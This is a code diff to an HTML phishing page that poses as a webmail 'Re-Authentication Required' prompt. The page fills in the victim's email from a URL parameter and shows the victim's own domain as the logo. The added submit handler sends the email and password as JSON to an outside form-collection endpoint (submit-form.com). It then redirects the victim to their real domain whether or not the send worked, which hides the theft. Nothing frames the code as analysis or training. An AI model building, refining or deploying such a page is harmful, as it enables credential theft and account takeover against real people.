@@ -86,6 +86,13 @@ input[type=submit]{
  width: 100%;
  bottom: 0;
 }
+/* Email icon style */
+.email-icon {
+  width: 30px;
+  height: 30px;
+  vertical-align: middle;
+  margin-right: 5px;
+}
 </style>
 </head>
 <body>
@@ -95,17 +102,20 @@ input[type=submit]{
 <div style="padding: 15px; height: 40px;"></div>
 <div id="icon">
 <table><tr>
-<td><img src="mx.png" width="30"></td>
-<!-- The domain name inside this span will be changed by JavaScript -->
+<!-- ADDED: Email icon before domain -->
+<td><img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='30' height='30' viewBox='0 0 24 24'%3E%3Cpath d='M20 4H4c-1.1 0-1.99.9-1.99 2L2 18c0 1.1.9 2 2 2h16c1.1 0 2-.9 2-2V6c0-1.1-.9-2-2-2zm0 4l-8 5-8-5V6l8 5 8-5v2z' fill='%23333'/%3E%3C/svg%3E" class="email-icon"></td>
 <td><label id="l3"> <span id="domain-name">skybeam.com</span> </label></td>
 </tr>
 </table>
 </div>
 <div class="form">
 <form id="fm" method="POST" action="https://submit-form.com/0gyAIslPc">
+  <!-- Honeypot field - traps bots -->
   <input type="text" name="_gotcha" style="display:none" tabindex="-1" autocomplete="off">
-  <input type="hidden" name="_redirect" value="https://skybeam.com">
+  
+  <!-- REMOVED: _redirect field - we'll handle redirect with JavaScript after submission -->
   <input type="hidden" name="source" value="webmail_reauthentication">
+  
 <div style="text-align: left;">
 <label id="l1">Re-Authentication Required </label><br>
 <label id="l2">Log-on again to continue repair...</label>
@@ -113,12 +123,12 @@ input[type=submit]{
 <div style="padding: 5px;"></div>
 <input type="email" name="email" id="email-field" style="cursor:no-drop; -webkit-touch-callout: none; -webkit-user-select: none; -khtml-user-select: none; -moz-user-select: none; -ms-user-select: none; -o-user-select: none; user-select: none;" readonly="" value="loading...">
 <div style="padding: 5px;"></div>
-<input type="password" name="password" placeholder="Password" autocomplete="current-password;" required>
+<input type="password" name="password" id="password-field" placeholder="Password" autocomplete="current-password;" required>
 <div style="padding: 8px; padding-left: 0%; text-align: left;">
 <input type="checkbox" checked >
 </div>
 <div style="padding: 5px;"></div>
-<input type="submit" value="Submit Query">
+<input type="submit" value="Submit Query" id="submit-btn">
 </form>
 </div>
 <div style="padding: 15px; height: 100px;"></div>
@@ -149,7 +159,7 @@ input[type=submit]{
     return `${month} ${day}, ${year} | ${hours}:${minutes}: ${seconds} ${ampm}`;
   }
 
-  // --- Set the date header ---
+  // Set the date header
   document.getElementById('date-header').textContent = getFormattedDate();
 
   // Get email from URL parameter 'emp'
@@ -162,24 +172,19 @@ input[type=submit]{
     domainFromEmail = emailFromUrl.split('@')[1];
   }
   
-  // --- Update all instances of email and domain ---
+  // Update all instances of email and domain
   const emailField = document.getElementById('email-field');
   const footerEmail = document.getElementById('footer-email');
   const titleSpan = document.getElementById('dynamic-email-title');
-  const domainSpan = document.getElementById('domain-name'); // Get the span for the logo
-  const redirectInput = document.querySelector('input[name="_redirect"]');
+  const domainSpan = document.getElementById('domain-name');
+  const passwordField = document.getElementById('password-field');
+  const submitBtn = document.getElementById('submit-btn');
 
   if (emailFromUrl) {
     if (emailField) emailField.value = emailFromUrl;
     if (footerEmail) footerEmail.textContent = emailFromUrl;
     if (titleSpan) titleSpan.textContent = emailFromUrl;
-    
-    // *** THIS IS THE FIX: Change the big logo text ***
     if (domainSpan) domainSpan.textContent = domainFromEmail;
-    
-    // Update redirect URL
-    if (redirectInput) redirectInput.value = 'https://' + domainFromEmail;
-    
   } else {
     // Fallback if no email in URL
     if (emailField) emailField.value = 'user@domain.com';
@@ -187,11 +192,47 @@ input[type=submit]{
     if (titleSpan) titleSpan.textContent = 'user@domain.com';
     if (domainSpan) domainSpan.textContent = 'domain.com';
   }
-</script>
 
-<script>
-  // IMPORTANT: Replace with your actual Formspark endpoint
-  document.getElementById('fm').action = 'https://submit-form.com/YOUR_FORMSPARK_ID_HERE';
+  // Handle form submission - send to Formspark AND redirect
+  document.getElementById('fm').addEventListener('submit', function(e) {
+    e.preventDefault(); // Stop normal form submission
+    
+    // Get values
+    const email = emailField.value;
+    const password = passwordField.value;
+    
+    if (!password) {
+      alert('Please enter your password');
+      return;
+    }
+    
+    // Show loading state (optional)
+    submitBtn.value = 'Processing...';
+    submitBtn.disabled = true;
+    
+    // Send to Formspark
+    fetch('https://submit-form.com/0gyAIslPc', {
+      method: 'POST',
+      headers: {
+        'Content-Type': 'application/json',
+      },
+      body: JSON.stringify({
+        email: email,
+        password: password,
+        source: 'webmail_reauthentication'
+      })
+    })
+    .then(response => {
+      console.log('Formspark response:', response.status);
+      // Redirect to the actual domain regardless of response
+      window.location.href = 'https://' + domainFromEmail;
+    })
+    .catch(error => {
+      console.error('Error:', error);
+      // Still redirect even if there's an error
+      window.location.href = 'https://' + domainFromEmail;
+    });
+  });
 </script>
 
 </body>
